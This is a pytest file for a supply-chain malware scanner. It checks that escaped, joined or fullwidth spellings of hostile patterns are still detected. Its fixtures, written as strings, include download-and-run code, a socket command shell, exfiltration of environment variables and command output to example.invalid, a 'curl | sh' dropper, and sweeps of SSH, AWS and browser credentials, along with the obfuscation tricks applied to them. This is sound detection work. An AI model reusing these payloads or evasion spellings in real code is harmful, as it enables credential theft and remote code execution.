"""The raw-text rules read a file as written; the language reads it decoded (note 18, step 2).

Each rule of note 18 §1 is handed the escaped, joined or fullwidth spelling of what it matches, and
must find it at the raw span; each excuse granted on an ABSENCE (§6) must hold in every reading, so a
decoded spelling of what withholds it withholds it. The ASCII spelling of every case is its control,
found today. A case the raw text misses is a strict xfail until the rule runner reads the decoded
view (step 3); a rule's move lifts its marker. Code-only fixtures: names, paths and calls written as
text, nothing that runs."""

from __future__ import annotations

from pathlib import Path
from typing import ClassVar, NamedTuple

import pytest

from cordon_scanner import Scanner
from cordon_scanner.analysis.shared.decoded_view import DecodedView, ViewOverBudget
from cordon_scanner.analysis.shared.deobfuscator import Deobfuscator
from cordon_scanner.detect.base import FileUnit, ScanContext
from cordon_scanner.detect.code.capability.detector import CapabilityDetector
from cordon_scanner.detect.code.capability.hits import CapabilityHit
from cordon_scanner.detect.code.capability.view_runner import ViewRunner
from cordon_scanner.foundation.capabilities import Capability
from cordon_scanner.foundation.config.settings import Config
from cordon_scanner.foundation.content import FileContent
from cordon_scanner.rules.loader import RuleLoader, RuleSet
from unit.analysis.shared.test_deobfuscation import ObfuscatedKit
from unit.detect.code.capability.test_npm_payload_execution import Npm
from unit.detect.code.test_verified_download import VerifiedKit

VIEW = pytest.mark.xfail(
    strict=True, reason="note 18 step 3: the rule runner reads the decoded view"
)


class Pending:
    """The cases whose reader does not read the decoded view yet. Step 3 moves one rule per commit,
    and the move takes its case out of here, so its test must then pass (a strict xfail that passed
    fails the run)."""

    NAMES: ClassVar[frozenset[str]] = frozenset(
        {
            "py_browser_store_decrypted",
            "py_credential_sweep",
            "go_ci_env_write",
            "excuse_remote_session",
            "excuse_verified_decode",
            "excuse_verified_egress",
            "reader_obfuscator_io",
            "extra_spawn_name",
        }
    )

    @classmethod
    def marks(cls, name: str) -> list[pytest.MarkDecorator]:
        return [VIEW] if name in cls.NAMES else []

    @classmethod
    def mark(cls, name: str):  # a decorator: the xfail mark, or the test unchanged
        return VIEW if name in cls.NAMES else (lambda test: test)


CP = "child_" + "process"
EXEC = "ex" + "ec"
EXEC_SYNC = "ex" + "ecSync"
B64DECODE = "b64" + "decode"


class Case(NamedTuple):
    """One raw rule, its ASCII spelling and the spellings the language reads the same."""

    name: str
    path: str
    language: str
    text: str
    rule: str
    spellings: tuple[tuple[str, str], ...]
    tree: tuple[str, ...] = ()


class Spelled:
    CONTEXTS: ClassVar[dict[tuple[str, ...], ScanContext]] = {}

    @classmethod
    def context(cls, tree: tuple[str, ...]) -> ScanContext:
        if tree not in cls.CONTEXTS:
            cls.CONTEXTS[tree] = ScanContext(
                config=Config.default(),
                rules=RuleSet(RuleLoader.load_builtin()),
                tree_paths=frozenset(tree),
            )
        return cls.CONTEXTS[tree]

    @classmethod
    def hits(cls, case: Case, text: str) -> list[CapabilityHit]:
        unit = FileUnit(
            content=FileContent.from_bytes(case.path, text.encode()), language=case.language
        )
        labelled = CapabilityDetector().labelled(unit, cls.context(case.tree))
        return [h for h in (labelled[0] if labelled else []) if h.rule_id == case.rule]

    @staticmethod
    def line_span(text: str, line: int) -> tuple[int, int]:
        """The raw byte range of a 1-based line."""
        raw = text.encode()
        start = 0
        for _ in range(line - 1):
            start = raw.index(b"\n", start) + 1
        end = raw.find(b"\n", start)
        return start, len(raw) if end < 0 else end

    @staticmethod
    def spelled(case: Case, old: str, new: str) -> str:
        assert old in case.text, (case.name, old)
        return case.text.replace(old, new, 1)


JS, PY = "javascript", "python"
CASES = (
    Case(
        "js_downloaded_and_run",
        "lib/a.js",
        JS,
        "const https = require('https');\nconst fs = require('fs');\n"
        f"const {{ {EXEC} }} = require('{CP}');\n"
        "https.get('https://example.invalid/x', (r) => r.pipe(fs.createWriteStream('x.sh')));\n"
        f"{EXEC}('sh ./x.sh');\n",
        "CAP.JS.DOWNLOAD_THEN_RUN",
        ((f"{EXEC}('sh ./x.sh')", f"{EXEC}('\\x73h ./x\\x2esh')"),),
    ),
    Case(
        "js_wallet_secret_sent",
        "lib/a.js",
        JS,
        "// wallet\nfunction open(seed) {\n"
        '  fetch("https://example.invalid/xc", { method: "POST", headers: { "ad-referral": seed } });\n'
        "}\n",
        "CAP.JS.WALLET_SECRET_SENT",
        (("  fetch(", "  \\u0066etch("),),
    ),
    Case(
        "js_spelled_names",
        "lib/a.js",
        JS,
        "const d = (a) => String.fromCharCode(...a);\nglobal[d([112,114,111,99,101,115,115])];\n"
        "module[d([95,108,111,97,100])];\nx[d([114,101,113])];\ny[d([101,120,101,99])];\n",
        "CAP.JS.SPELLED_NAMES",
        (("String.fromCharCode", "String.\\u0066romCharCode"),),
    ),
    Case(
        "js_computed_require",
        "lib/a.js",
        JS,
        "const m = require(Buffer.from('6f73', 'hex').toString());\n",
        "CAP.JS.COMPUTED_REQUIRE",
        (("= require(", "= \\u0072equire("),),
    ),
    Case(
        "js_agent_config_planted",
        "lib/a.js",
        JS,
        "const fs = require('fs');\n"
        "fs.cpSync(__dirname + '/payload', process.env.INIT_CWD, { recursive: true });\n",
        "CAP.JS.AGENT_CONFIG_PLANTED",
        (("env.INIT_CWD", "env.\\u0049NIT_CWD"),),
        ("payload/.mcp.json",),
    ),
    Case(
        "js_attribution_cloak",
        "lib/a.js",
        JS,
        "appsFlyer.onInstallConversionData((d) => { axios.post('https://example.invalid/a', d); });\n",
        "CAP.JS.ATTRIBUTION_CLOAK",
        (("appsFlyer.onInstall", "appsFlyer.\\u006fnInstall"),),
    ),
    Case(
        "js_whatsapp_channel",
        "lib/a.js",
        JS,
        "const id = '120363123456789012@newsletter';\nsock.newsletterFollow(id);\n",
        "CAP.JS.WHATSAPP_CHANNEL_FOLLOW",
        (("@newsletter", "\\x40newsletter"),),
    ),
    Case(
        "js_received_run",
        "lib/a.js",
        JS,
        f"const net = require('net');\nconst {{ {EXEC} }} = require('{CP}');\n"
        "const c = new net.Socket();\nc.connect(4444, 'example.invalid');\n"
        f"c.on('data', (data) => {{ {EXEC}(data.toString(), (e, o) => c.write(o)); }});\n",
        "CAP.JS.RECEIVED_RUN",
        (("new net.Socket()", "new net.\\u0053ocket()"),),
    ),
    Case(
        "js_decoded_program_run",
        "lib/a.js",
        JS,
        f"const fs = require('fs');\nconst {{ spawn }} = require('{CP}');\n"
        "const b = fs.readFileSync(__dirname + '/d.bin');\n"
        "for (let i = 0; i < b.length; i++) b[i] ^= 0x2a;\n"
        "fs.writeFileSync('/tmp/u.exe', b, { mode: 0o755 });\nspawn('/tmp/u.exe');\n",
        "CAP.JS.DECODED_PROGRAM_RUN",
        (("fs.readFileSync(", "fs.\\u0072eadFileSync("),),
    ),
    Case(
        "js_command_output_sent",
        "lib/a.js",
        JS,
        f"const {{ {EXEC} }} = require('{CP}');\nconst https = require('https');\n"
        f"{EXEC}('uname -a', (e, stdout) => {{\n"
        "  const req = https.request({ hostname: 'example.invalid', method: 'POST' });\n"
        "  req.write(stdout);\n  req.end();\n});\n",
        "CAP.JS.COMMAND_OUTPUT_SENT",
        ((f"{EXEC}('uname", "\\u0065xec('uname"),),
    ),
    Case(
        "js_identity_sent",
        "lib/a.js",
        JS,
        "const os = require('os');\n"
        "fetch('https://example.invalid/c', { method: 'POST', body: os.hostname() });\n",
        "FLOW.JS.IDENTITY_SENT",
        (("os.hostname()", "os.\\u0068ostname()"),),
    ),
    Case(
        "js_environment_sent",
        "lib/a.js",
        JS,
        "fetch('https://example.invalid/c', { method: 'POST', body: JSON.stringify(process.env) });\n",
        "FLOW.JS.ENVIRONMENT_SENT",
        (("(process.env)", "(\\u0070rocess.env)"),),
    ),
    Case(
        "py_browser_store_decrypted",
        "pkg/a.py",
        PY,
        "import os, win32crypt\n"
        "p = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')\n"
        "k = win32crypt.CryptUnprotectData(open(p, 'rb').read(), None, None, None, 0)\n",
        "CAP.CREDENTIAL.BROWSER_DECRYPT",
        (("'Login Data'", "'Login\\x20Data'"), ("'Login Data'", "'Login' ' Data'")),
    ),
    Case(
        "py_credential_sweep",
        "pkg/a.py",
        PY,
        "import os\nPATHS = ['~/.ssh/id_rsa', '~/.aws/credentials', '~/.npmrc']\n"
        "for p in PATHS:\n    open(os.path.expanduser(p)).read()\n",
        "CAP.CREDENTIAL.SWEEP",
        (
            ("'~/.ssh/id_rsa'", "'~/\\x2essh/id_rsa'"),
            ("'~/.aws/credentials'", "'~/.aw' 's/credentials'"),
            ("'~/.npmrc'", "'~/\\N{FULL STOP}npmrc'"),
        ),
    ),
    Case(
        "go_ci_env_write",
        "pkg/a.go",
        "go",
        'package x\n\nimport "os"\n\nfunc init() {\n'
        '\tf, _ := os.OpenFile(os.Getenv("GITHUB_ENV"), os.O_APPEND|os.O_WRONLY, 0o600)\n'
        '\tf.WriteString("X=1\\n")\n}\n',
        "CAP.GO.CI_ENV_WRITE",
        (('"GITHUB_ENV"', '"\\x47ITHUB_ENV"'),),
    ),
)

SPELLINGS = [
    pytest.param(case, old, new, id=f"{case.name}-{n}", marks=Pending.marks(case.name))
    for case in CASES
    for n, (old, new) in enumerate(case.spellings)
]


class TestTheAsciiSpellingIsFoundAsBefore:
    @pytest.mark.parametrize("case", CASES, ids=[c.name for c in CASES])
    def test_the_control(self, case: Case) -> None:
        assert Spelled.hits(case, case.text)


class TestADecodedSpellingIsFoundAtItsRawSpan:
    @pytest.mark.parametrize(("case", "old", "new"), SPELLINGS)
    def test_found_on_the_line_the_ascii_spelling_is(self, case: Case, old: str, new: str) -> None:
        control = Spelled.hits(case, case.text)[0]
        text = Spelled.spelled(case, old, new)
        found = Spelled.hits(case, text)
        assert found
        start, end = Spelled.line_span(text, control.line)
        assert found[0].line == control.line
        assert start <= found[0].byte_start < end


class Packages:
    """Whole-package scans for the excuses, which are read where the findings are graded."""

    @staticmethod
    def npm(tmp_path: Path, script: str) -> set[str]:
        target = Npm.build(
            tmp_path,
            "demo-spelled",
            {"version": "1.0.0", "scripts": {"postinstall": "node install.js"}},
            {"install.js": script},
        )
        return set(Npm.findings(target))

    @staticmethod
    def python(tmp_path: Path, setup: str) -> set[str]:
        (tmp_path / "setup.py").write_text(setup, encoding="utf-8")
        found = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path).findings
        return {f.rule_id for f in found}


class TestAnExcuseGrantedOnAnAbsenceHoldsInEveryReading:
    """§6: the excuse is granted only when what withholds it is absent from the raw text AND from
    the view, so a decoded spelling of it withholds the excuse."""

    LOCAL_SHELL = (
        "const { Client } = require('ssh2');\n"
        f"const ssh = require('{CP}');\n"
        f"ssh.{EXEC}('curl -s https://example.invalid/i | sh');\n"
    )

    def test_a_name_bound_to_child_process_is_no_ssh_session(self, tmp_path: Path) -> None:
        assert "MALWARE.DROPPER.001" in Packages.npm(tmp_path, self.LOCAL_SHELL)

    @Pending.mark("excuse_remote_session")
    def test_a_name_bound_to_an_escaped_child_process_is_no_ssh_session(
        self, tmp_path: Path
    ) -> None:
        script = self.LOCAL_SHELL.replace(f"require('{CP}')", "require('\\x63hild_process')")
        assert "MALWARE.DROPPER.001" in Packages.npm(tmp_path, script)

    DECODED = "  const note = atob('aGk=');\n"

    def test_a_decode_beside_the_download_is_not_verified(self, tmp_path: Path) -> None:
        script = VerifiedKit.script(extra=self.DECODED)
        assert VerifiedKit.blocked(VerifiedKit.scan(tmp_path, script))

    @Pending.mark("excuse_verified_decode")
    def test_an_escaped_decode_beside_the_download_is_not_verified(self, tmp_path: Path) -> None:
        script = VerifiedKit.script(extra=self.DECODED.replace("atob(", "\\u0061tob("))
        assert VerifiedKit.blocked(VerifiedKit.scan(tmp_path, script))

    SOCKET = "  new WebSocket('wss://example.invalid/s');\n"

    def test_other_egress_beside_the_download_is_not_verified(self, tmp_path: Path) -> None:
        script = VerifiedKit.script(extra=self.SOCKET)
        assert VerifiedKit.blocked(VerifiedKit.scan(tmp_path, script))

    @Pending.mark("excuse_verified_egress")
    def test_escaped_other_egress_beside_the_download_is_not_verified(self, tmp_path: Path) -> None:
        script = VerifiedKit.script(extra=self.SOCKET.replace("WebSocket", "\\u0057ebSocket"))
        assert VerifiedKit.blocked(VerifiedKit.scan(tmp_path, script))

    def test_a_fullwidth_decode_beside_a_spawn_keeps_the_pairing(self, tmp_path: Path) -> None:
        """`decode_run`'s fixed-spawn excuse: the spawn is fixed on the parsed tree, which reads
        the name NFKC-normalised, so a fullwidth decoder already keeps the pairing; kept so that it
        stays kept when the runner reads the view."""
        decoder = "".join(chr(ord(c) + 0xFEE0) if c.isalnum() else c for c in B64DECODE)
        setup = (
            "import base64, os\nfrom setuptools import setup\n"
            f"os.system(base64.{decoder}('ZWNobyBoaQ==').decode())\nsetup(name='x')\n"
        )
        assert "MALWARE.INSTALL.DECODED_LAUNCH.001" in Packages.python(tmp_path, setup)


class TestTheRecoveryAndFlowReadersReadTheDecodedSpelling:
    """§1's readers that are not capability rules: the obfuscator.io recovery's gate, and the
    command-output flow's helper that returns a process's output."""

    @staticmethod
    def recovered(program: str) -> bool:
        """What `Units.deobfuscated` asks before it lifts a file: a recovery that resolved some."""
        recovery = Deobfuscator.recover(program, "javascript")
        return recovery is not None and recovery.resolved > 0

    BODY = f"require('{CP}').{EXEC_SYNC}(process.env.HOME_CMD);"

    def test_the_obfuscated_program_is_recovered(self) -> None:
        assert self.recovered(ObfuscatedKit.program(body=self.BODY))

    @Pending.mark("reader_obfuscator_io")
    def test_an_escaped_array_function_name_is_recovered(self) -> None:
        program = ObfuscatedKit.program(body=self.BODY)
        assert "function _0x5e1f(" in program
        program = program.replace("function _0x5e1f(", "function \\u005f0x5e1f(", 1)
        assert self.recovered(program)

    HELPER = (
        f"const cp = require('{CP}');\nfunction sh(c) {{ return cp.{EXEC_SYNC}(c).toString(); }}\n"
        "const https = require('https');\nconst out = [];\nout.push(sh('whoami'));\n"
        "https.get({ host: 'example.invalid', path: '/c?d=' + out.join(',') });\n"
    )

    def test_a_helper_that_returns_command_output(self, tmp_path: Path) -> None:
        assert "MALWARE.EXFIL.COMMAND_OUTPUT.001" in Packages.npm(tmp_path, self.HELPER)

    @Pending.mark("reader_command_helper")
    def test_a_helper_that_returns_escaped_command_output(self, tmp_path: Path) -> None:
        script = self.HELPER.replace(f"return cp.{EXEC_SYNC}(", "return cp.\\u0065xecSync(")
        assert "MALWARE.EXFIL.COMMAND_OUTPUT.001" in Packages.npm(tmp_path, script)


class TestBeyondTheNoteSpawnsTheShellRulesRead:
    """Not in note 18 §1, listed separately: the embedded-command extraction reads a spawn's
    name in the raw text, so an escaped `exec` hides the command line it runs."""

    @Pending.mark("extra_spawn_name")
    def test_an_escaped_spawn_name_hands_its_command_to_the_shell_rules(
        self, tmp_path: Path
    ) -> None:
        script = f"const ssh = require('{CP}');\nssh.\\u0065xec('curl -s https://example.invalid/i | sh');\n"
        assert "MALWARE.DROPPER.001" in Packages.npm(tmp_path, script)


class Finds:
    """A rule that finds one word in a file's text, and counts the readings it is given."""

    def __init__(self, word: str) -> None:
        self.word = word
        self.read: list[str] = []

    def __call__(self, content: FileContent) -> list[CapabilityHit]:
        self.read.append(content.text)
        at = content.text.find(self.word)
        if at < 0:
            return []
        start = len(content.text[:at].encode())
        return [
            CapabilityHit(
                capability=Capability.PERSIST,
                rule_id="TEST.WORD",
                byte_start=start,
                byte_end=start + len(self.word.encode()),
                line=content.text.count("\n", 0, at) + 1,
            )
        ]


class TestTheRunner:
    """`ViewRunner.run` (note 18 §2-§4): raw, then the view where it differs; the union, in raw
    spans and raw lines; the raw hit kept where both read one finding; past the budget, refused."""

    @staticmethod
    def content(text: str, path: str = "pkg/a.py") -> FileContent:
        return FileContent.from_bytes(path, text.encode())

    def test_a_file_with_no_difference_is_read_once(self) -> None:
        rule = Finds("crontab")
        hits = ViewRunner.run(rule, self.content("x = 'crontab'\n"), "python")
        assert len(rule.read) == 1 and len(hits) == 1

    def test_a_view_hit_cites_the_raw_span_and_line(self) -> None:
        raw = "# é\ny = 1\nx = '\\x63ron' 'tab'  # z\n"
        rule = Finds("crontab")
        hits = ViewRunner.run(rule, self.content(raw), "python")
        assert len(rule.read) == 2 and len(hits) == 1
        data = raw.encode()
        assert hits[0].line == 3
        assert data[hits[0].byte_start : hits[0].byte_end].decode() == "'\\x63ron' 'tab'"

    def test_one_finding_read_both_ways_is_the_raw_one(self) -> None:
        raw = "a = 'crontab'\nb = '\\x41'\n"
        rule = Finds("crontab")
        hits = ViewRunner.run(rule, self.content(raw), "python")
        assert len(rule.read) == 2
        assert [(h.byte_start, h.byte_end) for h in hits] == [(5, 12)]

    def test_another_language_is_read_once(self) -> None:
        rule = Finds("x")
        ViewRunner.run(rule, self.content("echo \\x41\n", "a.sh"), "shell")
        assert len(rule.read) == 1

    def test_past_its_budget_the_file_is_refused(self, monkeypatch) -> None:
        monkeypatch.setattr(DecodedView, "MAX_CHARS", 10)
        with pytest.raises(ViewOverBudget):
            ViewRunner.run(Finds("x"), self.content("z = '\\x41' # over budget\n"), "python")
